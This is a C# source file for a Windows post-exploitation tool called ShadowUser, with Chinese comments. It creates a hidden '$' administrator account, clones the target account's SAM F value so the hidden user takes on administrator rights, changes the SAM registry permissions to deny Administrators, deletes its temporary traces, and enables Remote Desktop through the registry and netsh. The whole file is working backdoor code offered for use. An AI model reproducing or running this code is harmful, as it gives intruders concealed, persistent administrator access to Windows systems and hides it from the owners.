// stolen from https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs

using System;
using Microsoft.Win32;
using System.DirectoryServices;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using System.IO;
using System.Text;

namespace ShadowUser
{
    class Program
    {
        //流程控制写在Main函数,便于调试
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("[!] The default is 10 bits random password, Don't change your password !");
                Console.WriteLine("\nUsage: ShadowUser.exe <User> <CloneUser>");
                Console.WriteLine("   Eg: ShadowUser.exe zhangsan administrator");
            }
            else
            {
                string user = args[0];
                string cloneuser = args[1];
                string users = user + "$";
                //10位随机密码
                string chars = "!@#$%0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                Random randrom = new Random((int)DateTime.Now.Ticks);
                string password = "";
                for (int i = 0; i < 10; i++)
                {
                    password += chars[randrom.Next(chars.Length)];
                }
                //6位随机文本名
                string txt = "";
                for (int i = 0; i < 6; i++)
                {
                    txt += chars[randrom.Next(chars.Length)];
                }
                string[] usernames = { cloneuser, users };
                //用户添加，管理员权限
                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                    DirectoryEntry NewUser = AD.Children.Add(users, "user");
                    NewUser.Invoke("SetPassword", new object[] { password });
                    //NewUser.Invoke("Put", new object[] { "Description", "Test User from .NET" });
                    NewUser.CommitChanges();
                    DirectoryEntry grp;

                    grp = AD.Children.Find("Administrators", "group");
                    if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
                    //Console.WriteLine("Account Created Successfully");
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    //Console.WriteLine($"[-] The random password: {password}");
                    Console.WriteLine("[-] Run the program again !");
                    Environment.Exit(0);
                }
                //注册表键值ACL修改(SYSTEM Allow)
                RegACLAllow();
                //导出注册表Username
                foreach (string username in usernames)
                {
                    try
                    {
                        ExportRegNames($@"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\{username}", $@"C:\Windows\Temp\{username}.reg", username, txt);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Console.WriteLine("\nUsage: ShadowUser.exe <User> <CloneUser>");
                        Console.WriteLine("   Eg: ShadowUser.exe zhangsan administrator");
                        //克隆用户不存在，删除创建的隐藏用户
                        Deluser(users);
                        Environment.Exit(0);
                    }
                }
                //F值替换
                Clone($@"C:\Windows\Temp\{txt}.txt");
                //用户删除
                Deluser(users);
                //导入注册表 User & UsersF
                ImportReg($@"C:\Windows\Temp\{users}.reg", $@"C:\Windows\Temp\UsersF.reg");
                //注册表键值ACL修改(Administrators Deny)
                RegACLDeny();
                //删除导出的文件
                DelFiles(txt, users, cloneuser);
                //RDP状态查询与开启端口
                RDP();
                Console.WriteLine("[*] ShadowUser Created Successfully");
                Console.WriteLine($"[+] CloneUser: {cloneuser}\n[+] Username: {users}\n[+] Password: {password}");
            }
        }
        public static void RegACLAllow()
        {
            //打开注册表项“HKEY_LOCAL_MACHINE\SAM\SAM”,使用 OpenSubKey 方法得到一个能够更改权限的 RegistryKey 类的实例
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SAM\SAM", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions);
            //注册表项的 Windows 访问控制安全性。
            RegistrySecurity rs = new RegistrySecurity();
            //一个给“SYSTEM”用户“完全控制权限”的规则
            RegistryAccessRule rar = new RegistryAccessRule("SYSTEM", RegistryRights.FullControl, AccessControlType.Allow);
            //把规则添加到列表里
            rs.AddAccessRule(rar);
            //为注册表项设置权限
            rk.SetAccessControl(rs);
        }
        public static void ExportRegNames(string RegKey, string SavePath, string username, string txt)
        {
            string path = "\"" + SavePath + "\"";
            string key = "\"" + RegKey + "\"";

            var proc = new Process();
            try
            {
                proc.StartInfo.FileName = "regedit.exe";
                proc.StartInfo.UseShellExecute = false;
                proc = Process.Start("regedit.exe", "/e " + path + " " + key + "");
                if (proc != null) proc.WaitForExit();
            }
            finally
            {
                if (proc != null) proc.Dispose();
            }
            string text = File.ReadAllText($@"C:\Windows\Temp\{username}.reg");
            string pattern = @"(?is)(?<=\()(.*)(?=\))";
            string result = new Regex(pattern).Match($"{text}").Value;
            string users = "00000" + result + Environment.NewLine;
            File.AppendAllText($@"C:\Windows\Temp\{txt}.txt", users);
        }
        public static void Clone(string filename)
        {
            FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.None);
            try
            {
                StreamReader reader = new StreamReader(fs, Encoding.Default);
                string line1 = reader.ReadLine(); //第一行
                //Console.WriteLine(line1);
                RegistryKey key = Registry.LocalMachine;
                RegistryKey cureg = key.OpenSubKey($@"SAM\SAM\Domains\Account\Users\{line1}", true);
                byte[] cuFvalue = (byte[])cureg.GetValue("F");
                //Console.WriteLine(cuFvalue.Length);
                string line2 = Convert.ToString(reader.ReadLine()); //第二行
                //Console.WriteLine(line2);
                reader.Close();
                RegistryKey ureg = key.OpenSubKey($@"SAM\SAM\Domains\Account\Users\{line2}", true);
                ureg.SetValue("F", cuFvalue, RegistryValueKind.Binary);
                ureg.Close();
                key.Close();

                ExportRegUsers($@"HKEY_LOCAL_MACHINE\SAM\\SAM\Domains\Account\Users\{line2}", $@"C:\Windows\Temp\UsersF.reg");
            }
            finally
            {
                fs.Close();
            }
        }
        public static void Deluser(string users)
        {
            try
            {
                DirectoryEntry DE = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry DelUsers = DE.Children.Find(users, "user");
                DE.Children.Remove(DelUsers);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Environment.Exit(0);
            }
        }
        public static void ExportRegUsers(string RegKey, string SavePath)
        {
            string path = "\"" + SavePath + "\"";
            string key = "\"" + RegKey + "\"";

            var proc = new Process();
            try
            {
                proc.StartInfo.FileName = "regedit.exe";
                proc.StartInfo.UseShellExecute = false;
                proc = Process.Start("regedit.exe", "/e " + path + " " + key + "");

                if (proc != null) proc.WaitForExit();
            }
            finally
            {
                if (proc != null) proc.Dispose();
            }
        }
        //导入注册表
        public static void ImportReg(string NameReg, string UserReg)
        {
            string namepath = "\"" + NameReg + "\"";
            string userpath = "\"" + UserReg + "\"";

            {
                var proc = new Process();
                try
                {
                    proc.StartInfo.FileName = "regedit.exe";
                    proc.StartInfo.UseShellExecute = false;
                    proc = Process.Start("regedit.exe", "/s " + namepath);
                    proc = Process.Start("regedit.exe", "/s " + userpath);

                    if (proc != null) proc.WaitForExit();
                }
                finally
                {
                    if (proc != null) proc.Dispose();
                }
            }
        }
        public static void RegACLDeny()
        {
            RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SAM\SAM", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions);
            RegistrySecurity rs = new RegistrySecurity();
            RegistryAccessRule rar = new RegistryAccessRule("Administrators", RegistryRights.FullControl, AccessControlType.Deny);
            rs.AddAccessRule(rar);
            rk.SetAccessControl(rs);
        }
        public static void DelFiles(string txt, string users, string cloneuser)
        {
            string[] files = { users, cloneuser, "UsersF" };
            foreach (string filename in files)
            {
                File.Delete($@"C:\Windows\Temp\{filename}.reg");
            }
            File.Delete($@"C:\Windows\Temp\{txt}.txt");
        }
        public static void RDP()
        {
            RegistryKey key = Registry.LocalMachine;
            //REG查询3389状态（0: ON 、1: OFF）
            RegistryKey RDPstatus = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            string status = RDPstatus.GetValue("fDenyTSConnections").ToString();
            //Console.WriteLine(status);

            RegistryKey RDPport = key.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp");
            string port = RDPport.GetValue("PortNumber").ToString();
            RDPport.Close();

            if (status.Contains("0"))
            {
                Console.WriteLine("[*] RDP is already enabled");
                Console.WriteLine($"[+] RDP Port: {port}");

            }
            else
            {
                //参考Metasploit中 post/windows/manage/enable_rdp 模块
                Console.WriteLine("[*] RDP is disabled, enabling it ...");
                RegistryKey RDPopen = key.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
                RDPopen.SetValue("fDenyTSConnections", "0", RegistryValueKind.DWord);
                RDPopen.Close();

                {
                    Process p = new Process();
                    //设置要启动的应用程序
                    p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                    //是否使用操作系统shell启动
                    p.StartInfo.UseShellExecute = false;
                    //接受来自调用程序的输入信息
                    p.StartInfo.RedirectStandardInput = true;
                    //输出信息
                    p.StartInfo.RedirectStandardOutput = true;
                    //输出错误
                    p.StartInfo.RedirectStandardError = true;
                    //不显示程序窗口
                    p.StartInfo.CreateNoWindow = true;
                    p.Start();
                    p.StandardInput.WriteLine(@"sc config termservice start= auto");
                    p.StandardInput.WriteLine(@"netsh firewall set service remotedesktop enable");
                    p.StandardInput.WriteLine("exit");
                    p.WaitForExit();
                    p.Close();
                    p.Dispose();
                }
                Console.WriteLine($"[+] RDP Port: {port}");
            }
        }
    }
}
